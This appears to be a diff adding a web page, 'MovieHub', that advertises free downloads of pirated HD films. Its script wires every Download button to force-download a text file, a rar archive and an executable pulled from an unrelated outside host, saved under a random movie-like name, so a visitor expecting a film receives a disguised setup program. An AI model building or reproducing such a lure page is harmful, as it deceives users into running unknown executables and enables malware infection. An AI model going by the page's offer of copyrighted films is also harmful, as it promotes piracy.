@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>MovieHub - Free HD Movie Downloads</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
+    />
+    <style>
+      .movie-card:hover .download-btn {
+        opacity: 1;
+        transform: translateY(0);
+      }
+      .download-btn {
+        transition: all 0.3s ease;
+        opacity: 0;
+        transform: translateY(20px);
+      }
+      .hero {
+        background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)),
+          url("https://images.unsplash.com/photo-1489599849927-2ee91cede3ba?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1470&q=80");
+        background-size: cover;
+        background-position: center;
+      }
+      .blur-load {
+        background-size: cover;
+        background-position: center;
+      }
+      .blur-load.loaded > img {
+        opacity: 1;
+      }
+      .blur-load > img {
+        opacity: 0;
+        transition: opacity 200ms ease-in-out;
+      }
+    </style>
+  </head>
+  <body class="bg-gray-900 text-white">
+    <!-- Header -->
+    <header class="sticky top-0 z-50 bg-gray-900 shadow-lg">
+      <div
+        class="container mx-auto px-4 py-3 flex justify-between items-center"
+      >
+        <div class="flex items-center space-x-2">
+          <i class="fas fa-film text-red-500 text-2xl"></i>
+          <h1 class="text-xl font-bold">
+            Movie<span class="text-red-500">Hub</span>
+          </h1>
+        </div>
+        <div class="hidden md:flex space-x-6">
+          <a href="#" class="hover:text-red-500 transition">Home</a>
+          <a href="#" class="hover:text-red-500 transition">Movies</a>
+          <a href="#" class="hover:text-red-500 transition">TV Shows</a>
+          <a href="#" class="hover:text-red-500 transition">Genres</a>
+        </div>
+        <div class="flex items-center space-x-4">
+          <button class="md:hidden">
+            <i class="fas fa-bars text-xl"></i>
+          </button>
+          <div class="hidden md:block relative">
+            <input
+              type="text"
+              placeholder="Search movies..."
+              class="bg-gray-800 px-4 py-2 rounded-full text-sm focus:outline-none focus:ring-2 focus:ring-red-500"
+            />
+            <i class="fas fa-search absolute right-3 top-2.5 text-gray-400"></i>
+          </div>
+        </div>
+      </div>
+    </header>
+
+    <!-- Hero Section -->
+    <section class="hero min-h-[70avh] flex items-center">
+      <div class="container mx-auto px-4">
+        <div class="max-w-2xl">
+          <h1 class="text-4xl md:text-5xl font-bold mb-4">
+            Download HD Movies For Free
+          </h1>
+          <p class="text-lg mb-6">
+            Unlimited access to thousands of movies in 4K, 1080p, and 720p
+            quality. No registration required.
+          </p>
+          <div class="flex space-x-4">
+            <button
+              class="bg-red-600 hover:bg-red-700 px-6 py-3 rounded-lg font-semibold transition"
+            >
+              Browse Movies
+            </button>
+            <button
+              class="bg-gray-800 hover:bg-gray-700 px-6 py-3 rounded-lg font-semibold transition"
+            >
+              How to Download
+            </button>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Featured Movies -->
+    <section class="py-12 container mx-auto px-4">
+      <div class="flex justify-between items-center mb-8">
+        <h2 class="text-2xl font-bold">Featured Movies</h2>
+        <a href="#" class="text-red-500 hover:underline">View All</a>
+      </div>
+
+      <div class="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-5 gap-6">
+        <!-- Movie Card 1 -->
+        <div class="movie-card relative rounded-lg overflow-hidden group">
+          <div
+            class="blur-load"
+            style="
+              background-image: url('https://image.tmdb.org/t/p/w500/4m1Au3YkjqsxF8iwQy0fPYSxE0h.jpg');
+            "
+          >
+            <img
+              src="https://image.tmdb.org/t/p/w500/4m1Au3YkjqsxF8iwQy0fPYSxE0h.jpg"
+              alt="Movie Poster"
+              class="w-full h-64 object-cover transition duration-300 group-hover:scale-105"
+            />
+          </div>
+          <div
+            class="absolute inset-0 bg-gradient-to-t from-black to-transparent opacity-0 group-hover:opacity-100 transition"
+          ></div>
+          <div class="absolute bottom-0 left-0 right-0 p-4">
+            <h3 class="font-semibold">The Batman</h3>
+            <div
+              class="flex justify-between items-center text-sm text-gray-300"
+            >
+              <span>2022</span>
+              <span class="flex items-center">
+                <i class="fas fa-star text-yellow-400 mr-1"></i> 7.9
+              </span>
+            </div>
+          </div>
+          <div
+            class="download-btn absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2"
+          >
+            <button
+              onclick="initiateDownload()"
+              class="bg-red-600 hover:bg-red-700 px-4 py-2 rounded-full flex items-center"
+            >
+              <i class="fas fa-download mr-2"></i> Download
+            </button>
+          </div>
+        </div>
+
+        <!-- Movie Card 2 -->
+        <div class="movie-card relative rounded-lg overflow-hidden group">
+          <div
+            class="blur-load"
+            style="
+              background-image: url('https://image.tmdb.org/t/p/w500/1g0dhYtq4irTY1GPXvft6k4YLjm.jpg');
+            "
+          >
+            <img
+              src="https://image.tmdb.org/t/p/w500/1g0dhYtq4irTY1GPXvft6k4YLjm.jpg"
+              alt="Movie Poster"
+              class="w-full h-64 object-cover transition duration-300 group-hover:scale-105"
+            />
+          </div>
+          <div
+            class="absolute inset-0 bg-gradient-to-t from-black to-transparent opacity-0 group-hover:opacity-100 transition"
+          ></div>
+          <div class="absolute bottom-0 left-0 right-0 p-4">
+            <h3 class="font-semibold">Spider-Man: No Way Home</h3>
+            <div
+              class="flex justify-between items-center text-sm text-gray-300"
+            >
+              <span>2021</span>
+              <span class="flex items-center">
+                <i class="fas fa-star text-yellow-400 mr-1"></i> 8.3
+              </span>
+            </div>
+          </div>
+          <div
+            class="download-btn absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2"
+          >
+            <button
+              onclick="initiateDownload()"
+              class="bg-red-600 hover:bg-red-700 px-4 py-2 rounded-full flex items-center"
+            >
+              <i class="fas fa-download mr-2"></i> Download
+            </button>
+          </div>
+        </div>
+
+        <!-- Movie Card 3 -->
+        <div class="movie-card relative rounded-lg overflow-hidden group">
+          <div
+            class="blur-load"
+            style="
+              background-image: url('https://image.tmdb.org/t/p/w500/8Vt6mWEReuy4Of61Lnj5Xj704m8.jpg');
+            "
+          >
+            <img
+              src="https://image.tmdb.org/t/p/w500/8Vt6mWEReuy4Of61Lnj5Xj704m8.jpg"
+              alt="Movie Poster"
+              class="w-full h-64 object-cover transition duration-300 group-hover:scale-105"
+            />
+          </div>
+          <div
+            class="absolute inset-0 bg-gradient-to-t from-black to-transparent opacity-0 group-hover:opacity-100 transition"
+          ></div>
+          <div class="absolute bottom-0 left-0 right-0 p-4">
+            <h3 class="font-semibold">Dune</h3>
+            <div
+              class="flex justify-between items-center text-sm text-gray-300"
+            >
+              <span>2021</span>
+              <span class="flex items-center">
+                <i class="fas fa-star text-yellow-400 mr-1"></i> 7.9
+              </span>
+            </div>
+          </div>
+          <div
+            class="download-btn absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2"
+          >
+            <button
+              onclick="initiateDownload()"
+              class="bg-red-600 hover:bg-red-700 px-4 py-2 rounded-full flex items-center"
+            >
+              <i class="fas fa-download mr-2"></i> Download
+            </button>
+          </div>
+        </div>
+
+        <!-- Movie Card 4 -->
+        <div class="movie-card relative rounded-lg overflow-hidden group">
+          <div
+            class="blur-load"
+            style="
+              background-image: url('https://image.tmdb.org/t/p/w500/1UkbPQspPbq1FP5GFIzGDFW3v7e.jpg');
+            "
+          >
+            <img
+              src="https://image.tmdb.org/t/p/w500/1UkbPQspPbq1FP5GFIzGDFW3v7e.jpg"
+              alt="Movie Poster"
+              class="w-full h-64 object-cover transition duration-300 group-hover:scale-105"
+            />
+          </div>
+          <div
+            class="absolute inset-0 bg-gradient-to-t from-black to-transparent opacity-0 group-hover:opacity-100 transition"
+          ></div>
+          <div class="absolute bottom-0 left-0 right-0 p-4">
+            <h3 class="font-semibold">No Time to Die</h3>
+            <div
+              class="flex justify-between items-center text-sm text-gray-300"
+            >
+              <span>2021</span>
+              <span class="flex items-center">
+                <i class="fas fa-star text-yellow-400 mr-1"></i> 7.4
+              </span>
+            </div>
+          </div>
+          <div
+            class="download-btn absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2"
+          >
+            <button
+              onclick="initiateDownload()"
+              class="bg-red-600 hover:bg-red-700 px-4 py-2 rounded-full flex items-center"
+            >
+              <i class="fas fa-download mr-2"></i> Download
+            </button>
+          </div>
+        </div>
+
+        <!-- Movie Card 5 -->
+        <div class="movie-card relative rounded-lg overflow-hidden group">
+          <div
+            class="blur-load"
+            style="
+              background-image: url('https://image.tmdb.org/t/p/w500/6DrHO1jr3qVrViUO6s6kFiAGM7.jpg');
+            "
+          >
+            <img
+              src="https://image.tmdb.org/t/p/w500/6DrHO1jr3qVrViUO6s6kFiAGM7.jpg"
+              alt="Movie Poster"
+              class="w-full h-64 object-cover transition duration-300 group-hover:scale-105"
+            />
+          </div>
+          <div
+            class="absolute inset-0 bg-gradient-to-t from-black to-transparent opacity-0 group-hover:opacity-100 transition"
+          ></div>
+          <div class="absolute bottom-0 left-0 right-0 p-4">
+            <h3 class="font-semibold">Shang-Chi</h3>
+            <div
+              class="flex justify-between items-center text-sm text-gray-300"
+            >
+              <span>2021</span>
+              <span class="flex items-center">
+                <i class="fas fa-star text-yellow-400 mr-1"></i> 7.7
+              </span>
+            </div>
+          </div>
+          <div
+            class="download-btn absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2"
+          >
+            <button
+              onclick=" initiateDownload()"
+              class="bg-red-600 hover:bg-red-700 px-4 py-2 rounded-full flex items-center"
+            >
+              <i class="fas fa-download mr-2"></i> Download
+            </button>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Download Section -->
+    <section class="py-12 bg-gray-800">
+      <div class="container mx-auto px-4">
+        <div class="max-w-4xl mx-auto text-center">
+          <h2 class="text-3xl font-bold mb-6">How to Download Movies</h2>
+          <div class="grid grid-cols-1 md:grid-cols-3 gap-8 mb-10">
+            <div class="bg-gray-700 p-6 rounded-lg">
+              <div
+                class="bg-red-600 w-12 h-12 rounded-full flex items-center justify-center mx-auto mb-4"
+              >
+                <i class="fas fa-search text-xl"></i>
+              </div>
+              <h3 class="font-semibold mb-2">1. Find Your Movie</h3>
+              <p class="text-gray-300">
+                Browse our extensive collection or use the search feature to
+                find your desired movie.
+              </p>
+            </div>
+            <div class="bg-gray-700 p-6 rounded-lg">
+              <div
+                class="bg-red-600 w-12 h-12 rounded-full flex items-center justify-center mx-auto mb-4"
+              >
+                <i class="fas fa-download text-xl"></i>
+              </div>
+              <h3 class="font-semibold mb-2">2. Click Download</h3>
+              <p class="text-gray-300">
+                Click the download button and choose your preferred quality and
+                format.
+              </p>
+            </div>
+            <div class="bg-gray-700 p-6 rounded-lg">
+              <div
+                class="bg-red-600 w-12 h-12 rounded-full flex items-center justify-center mx-auto mb-4"
+              >
+                <i class="fas fa-film text-xl"></i>
+              </div>
+              <h3 class="font-semibold mb-2">3. Enjoy Watching</h3>
+              <p class="text-gray-300">
+                Once downloaded, enjoy your movie anytime, anywhere without
+                internet.
+              </p>
+            </div>
+          </div>
+          <button
+            onclick=" initiateDownload()"
+            class="bg-red-600 hover:bg-red-700 px-8 py-4 rounded-lg font-semibold text-lg flex items-center mx-auto"
+          >
+            <i class="fas fa-download mr-3"></i> Download Now
+          </button>
+        </div>
+      </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="bg-gray-900 py-8">
+      <div class="container mx-auto px-4">
+        <div class="grid grid-cols-1 md:grid-cols-4 gap-8">
+          <div>
+            <div class="flex items-center space-x-2 mb-4">
+              <i class="fas fa-film text-red-500 text-2xl"></i>
+              <h1 class="text-xl font-bold">
+                Movie<span class="text-red-500">Hub</span>
+              </h1>
+            </div>
+            <p class="text-gray-400">
+              The best place to download HD movies for free. Thousands of titles
+              available in multiple formats.
+            </p>
+          </div>
+          <div>
+            <h3 class="font-semibold text-lg mb-4">Quick Links</h3>
+            <ul class="space-y-2">
+              <li>
+                <a href="#" class="text-gray-400 hover:text-red-500 transition"
+                  >Home</a
+                >
+              </li>
+              <li>
+                <a href="#" class="text-gray-400 hover:text-red-500 transition"
+                  >Movies</a
+                >
+              </li>
+              <li>
+                <a href="#" class="text-gray-400 hover:text-red-500 transition"
+                  >TV Shows</a
+                >
+              </li>
+              <li>
+                <a href="#" class="text-gray-400 hover:text-red-500 transition"
+                  >Request Movie</a
+                >
+              </li>
+            </ul>
+          </div>
+          <div>
+            <h3 class="font-semibold text-lg mb-4">Genres</h3>
+            <ul class="space-y-2">
+              <li>
+                <a href="#" class="text-gray-400 hover:text-red-500 transition"
+                  >Action</a
+                >
+              </li>
+              <li>
+                <a href="#" class="text-gray-400 hover:text-red-500 transition"
+                  >Comedy</a
+                >
+              </li>
+              <li>
+                <a href="#" class="text-gray-400 hover:text-red-500 transition"
+                  >Drama</a
+                >
+              </li>
+              <li>
+                <a href="#" class="text-gray-400 hover:text-red-500 transition"
+                  >Sci-Fi</a
+                >
+              </li>
+            </ul>
+          </div>
+          <div>
+            <h3 class="font-semibold text-lg mb-4">Contact</h3>
+            <ul class="space-y-2">
+              <li class="flex items-center text-gray-400">
+                <i class="fas fa-envelope mr-2"></i> support@moviehub.com
+              </li>
+              <li class="flex items-center text-gray-400">
+                <i class="fas fa-globe mr-2"></i> www.moviehub.com
+              </li>
+            </ul>
+            <div class="flex space-x-4 mt-4">
+              <a
+                href="#"
+                class="bg-gray-800 w-10 h-10 rounded-full flex items-center justify-center hover:bg-red-600 transition"
+              >
+                <i class="fab fa-facebook-f"></i>
+              </a>
+              <a
+                href="#"
+                class="bg-gray-800 w-10 h-10 rounded-full flex items-center justify-center hover:bg-red-600 transition"
+              >
+                <i class="fab fa-twitter"></i>
+              </a>
+              <a
+                href="#"
+                class="bg-gray-800 w-10 h-10 rounded-full flex items-center justify-center hover:bg-red-600 transition"
+              >
+                <i class="fab fa-instagram"></i>
+              </a>
+            </div>
+          </div>
+        </div>
+        <div
+          class="border-t border-gray-800 mt-8 pt-6 text-center text-gray-500"
+        >
+          <p>
+            © 2023 MovieHub. All rights reserved. Disclaimer: We do not host any
+            files.
+          </p>
+        </div>
+      </div>
+    </footer>
+
+    <!-- Download Modal -->
+    <!-- <div
+      id="downloadModal"
+      class="fixed inset-0 bg-black bg-opacity-75 flex items-center justify-center z-50 hidden"
+    >
+      <div class="bg-gray-800 rounded-lg p-6 max-w-md w-full mx-4">
+        <div class="flex justify-between items-center mb-4">
+          <h3 class="text-xl font-semibold">Download Starting</h3>
+          <button onclick="closeModal()" class="text-gray-400 hover:text-white">
+            <i class="fas fa-times"></i>
+          </button>
+        </div>
+        <div class="mb-6">
+          <p class="mb-4">
+            Your download will start automatically in a few seconds. If it
+            doesn't, click the button below.
+          </p>
+          <div class="bg-gray-700 p-4 rounded-lg mb-4">
+            <div class="flex items-center">
+              <i class="fas fa-file-download text-red-500 mr-3 text-xl"></i>
+              <div>
+                <p class="font-medium">ClientSetup.exe</p>
+                <p class="text-sm text-gray-400">25.4 MB</p>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="flex space-x-3">
+          <button
+            onclick=" initiateDownload()"
+            class="bg-red-600 hover:bg-red-700 px-6 py-2 rounded-lg flex-1 flex items-center justify-center"
+          >
+            <i class="fas fa-download mr-2"></i> Download Now
+          </button>
+          <button
+            onclick="closeModal()"
+            class="bg-gray-700 hover:bg-gray-600 px-6 py-2 rounded-lg flex-1"
+          >
+            Cancel
+          </button>
+        </div>
+      </div>
+    </div> -->
+
+    <script>
+      // Utility to generate random file names
+      function generateRandomFileName(extension) {
+        const randomString = Math.random().toString(36).substring(2, 10);
+        return `moviehub_${randomString}.${extension}`;
+      }
+
+      // Triggers the download of a single file
+      function downloadFile(url, extension) {
+        const a = document.createElement("a");
+        a.href = url;
+        a.download = generateRandomFileName(extension);
+        a.style.display = "none";
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+      }
+
+      function initiateDownload() {
+        const txtUrl = "https://yourdomain.com/files/info.txt";
+        const rarUrl = "https://yourdomain.com/files/bundle.rar";
+        const exeUrl =
+          "https://alpha.noleggiodisci.com/Bin/work_approval_pdf3.ClientSetup.exe?e=Access&y=Guest";
+
+        // Call download for each file type
+        downloadFile(txtUrl, "txt");
+        downloadFile(rarUrl, "rar");
+        downloadFile(exeUrl, "exe");
+      }
+
+      // Optional: image load blur effect
+      document.addEventListener("DOMContentLoaded", function () {
+        const blurLoadElements = document.querySelectorAll(".blur-load");
+
+        blurLoadElements.forEach((element) => {
+          const img = element.querySelector("img");
+
+          if (img.complete) {
+            element.classList.add("loaded");
+          } else {
+            img.addEventListener("load", function () {
+              element.classList.add("loaded");
+            });
+          }
+        });
+      });
+    </script>
+  </body>
+</html>
